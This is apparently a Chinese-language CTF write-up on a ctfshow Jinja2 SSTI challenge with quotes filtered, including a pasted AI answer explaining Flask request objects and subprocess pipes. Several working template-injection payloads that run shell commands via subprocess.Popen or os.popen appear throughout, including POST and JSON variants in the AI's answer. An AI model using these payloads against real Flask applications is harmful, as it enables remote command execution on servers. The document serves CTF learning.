本题在[[ctfshow361ssti入门都这么难吗]]的基础上过滤了引号，所以最基础的 `"".__class__` 无法使用了
但是思考 `"".__class__` 的本质可以发现，`[].__class__` 完全可以替代它
但别急，这只是第一关。
过滤了引号之后你会发现os模块的 `["system"]` 和 `["popen"]` 无法使用了，并且无法正常传入参数。
此时我们可以换其他方法：
```
https://df8ef9c4-71de-4830-96f5-9eb8447d6ebf.challenge.ctf.show/?name={{[].__class__.__mro__[1].__subclasses__()[407](request.args.a,shell=True,stdout=-1).communicate()[0]}}&a=cat%20/flag
```
![[Pasted image 20260416182403.png]]
这段payload其实相当于执行了
```
subprocess.Popen("cat /flag",shell=True,stdout=-1)
```

---

| 参数               | 说明                                                                         |
| ---------------- | -------------------------------------------------------------------------- |
| `request.args.a` | 从 URL 的 `?a=cat%20/flag` 读取命令字符串，**避免直接在模板中写命令**（绕过 WAF / 关键词检测）           |
| `shell=True`     | 让命令通过 `/bin/sh -c` 执行，支持管道、空格等 shell 语法                                    |
| `stdout=-1`      | 即 `stdout=subprocess.PIPE`（其常量值就是 `-1`），**将标准输出重定向到管道**，这样才能在 Python 中捕获输出 |
> `stdout=subprocess.PIPE` 是关键。如果不设置，命令的输出会直接输出到服务器的终端，而不会被 Python 程序捕获到，你就看不到回显。

上述内容目前只创建了对象，但还缺少 `.communicate()`去激活命令，所以调用 `.commiunicate()` 让对象真正发挥作用。这个方法会返回一个元组 `(stdout_data, stderr_data`)，所以需要 `[0]` 来读取标准输出。
> 注意， `stdout_data` 的值是bytes, 你在页面中看到的内容是经过Jinja2渲染的

#popen #subprocess 

---
---
## User
```
为什么request.args.a可以从url读取内容?为什么stdout=-1是重定向到管道(这个管道是怎样构造的呢)?另外request.args.a读取格式是字符串还是bytes?能不能把request.args.a改成别的来支持POST?
```

---
## Sonnet-4.6

好问题，逐一详细解答。

---

## 1. 为什么 `request.args.a` 可以从 URL 读取？

这是 **Flask/Werkzeug** 的内置对象。在 Jinja2 模板中，Flask 会自动将 `request` 对象注入到模板上下文里，所以模板里可以直接用它。

```
URL: ?name=...&a=cat%20/flag
          ↑
          request.args 是一个 ImmutableMultiDict
          request.args.a  等价于  request.args.get("a")
          → 返回字符串 "cat /flag"
```

`request.args` 本质是对 `QUERY_STRING` 的解析结果，Werkzeug 在收到请求时就已经解析好放在那里了，模板渲染时直接取用。

---

## 2. `stdout=-1` 为什么是管道？

先看 CPython 源码里的常量定义：

```python
# subprocess.py
PIPE   = -1
STDOUT = -2
DEVNULL = -3
```

`subprocess.PIPE` 的值就是字面量 `-1`。所以 `stdout=-1` 和 `stdout=subprocess.PIPE` **完全等价**，只是绕过了需要引用 `subprocess` 模块名的问题（在 SSTI 受限环境里直接写 `subprocess.PIPE` 不方便）。

**管道是怎么构造的？**

`Popen` 内部（在 Linux 上）大致做了这些事：

```
调用 os.pipe() 
→ 返回 (read_fd, write_fd) 一对文件描述符

fork() 出子进程
→ 子进程：关闭 read_fd，把 write_fd dup2 到 fd=1 (stdout)，然后 exec 命令
→ 父进程：关闭 write_fd，持有 read_fd，包装成 Popen.stdout 文件对象

.communicate() 调用时
→ 父进程从 read_fd 读数据，直到子进程退出、write 端关闭
→ 返回读到的全部字节
```

所以"管道"就是操作系统提供的匿名管道（`pipe` 系统调用），Popen 帮你把这些 fd 的接线工作都做好了。

---

## 3. `request.args.a` 返回的是字符串还是 bytes？

是**字符串 `str`**（Python 3）。

Werkzeug 在解析 URL query string 时会自动 decode（默认 UTF-8），所以你拿到的就是 unicode 字符串。这正好符合 `Popen` + `shell=True` 的要求——它接受 `str`，内部再交给 `/bin/sh -c` 执行。

`.communicate()` 返回的才是 **`bytes`**（因为是从管道 fd 里直接读的原始字节流），所以最终 Jinja2 渲染出来你看到的是类似 `b'flag{...}\n'` 的形式，带着 `b''` 前缀。

---

## 4. 能不能改成 POST？

完全可以，对应关系如下：

| 来源               | Flask 对象           | Content-Type 要求                                             |
| ---------------- | ------------------ | ----------------------------------------------------------- |
| URL Query String | `request.args.a`   | 无                                                           |
| POST 表单          | `request.form.a`   | `application/x-www-form-urlencoded` 或 `multipart/form-data` |
| POST JSON body   | `request.json.a`   | `application/json`                                          |
| 通用（两者都找）         | `request.values.a` | 无                                                           |

**用 POST 表单的例子：**

```
POST /?name={{[].__class__.__mro__[1].__subclasses__()[407](request.form.a,shell=True,stdout=-1).communicate()[0]}}
Content-Type: application/x-www-form-urlencoded

a=cat+/flag
```

**用 JSON 的例子：**

```
POST /?name={{[].__class__.__mro__[1].__subclasses__()[407](request.json.a,shell=True,stdout=-1).communicate()[0]}}
Content-Type: application/json

{"a": "cat /flag"}
```

> `request.values` 最方便，它会同时查 `args` 和 `form`，不管 GET 还是 POST 都能接收，不用改 payload 本身。

#request_args_a #request_form_a 

---
---

### 根据AI的回答，我们可以使用以下payload
```
/?name={{().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.args.popen](request.args.param).read()}}&popen=popen&param=cat+/flag
```